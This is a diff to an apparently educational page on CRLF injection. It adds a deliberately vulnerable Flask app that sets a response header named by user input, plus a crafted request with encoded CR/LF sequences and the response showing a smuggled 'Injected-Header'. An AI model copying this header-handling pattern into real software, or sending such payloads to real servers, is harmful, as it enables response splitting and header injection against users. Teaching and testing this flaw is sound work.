@@ -19,9 +19,28 @@ A type of CRLF attack that targets systems utilizing Memcached, a distributed me
 A broader attack that sometimes involves CRLF injection. In this scenario, an attacker tricks the server into making requests to internal resources by injecting malicious input containing CRLF sequences. The attacker may exploit this to access sensitive information, pivot through internal systems, or perform unauthorized actions on behalf of the server.
 
 
+=== Python
+  ```python
+  import flask
+  from flask import request
+  from flask import make_response
+  
+  app = flask.Flask(__name__)
+  
+  @app.route("/")
+  def index():
+      header = request.args.get("header")
+      username = request.args.get("username")
+      resp = make_response("Hello: %s" % username)
+      resp.headers.set(header, username)
+      return resp
+  
+  app.run(host="0.0.0.0", port=8080)
+  ```
+
 === Request
   ```http
-  GET /?page=login%0D%0ACustom-Header:%20vulnerable HTTP/1.1
+  GET /?header=GET%20/?name=A:a%0a%0dA:d%0d%0d%0a%0dInjected-Header&username=abc HTTP/1.1
   Host: localhost
   User-Agent: Mozilla/5.0
   Referrer: http://localhost/
@@ -30,12 +49,17 @@ A broader attack that sometimes involves CRLF injection. In this scenario, an at
 === Response
   ```http
   HTTP/1.1 200 OK
-  Date: Wed, 05 Jan 2024 12:00:00 GMT
-  Server: Apache/2.2.31 (Unix)
-  Content-Length: 1234
-  Content-Type: text/html; charset=UTF-8
-  Set-Cookie: page=login
-  Custom-Header: vulnerable
+  Server: Werkzeug/2.3.7 Python/3.10.12
+  Date: Tue, 09 Jan 2024 11:03:05 GMT
+  Content-Type: text/html; charset=utf-8
+  Content-Length: 10
+  GET /?name=A:a
   
-  <body>
+  A:d
+  
+  
+  Injected-Header: abc
+  Connection: close
+  
+  Hello: abc
   ```
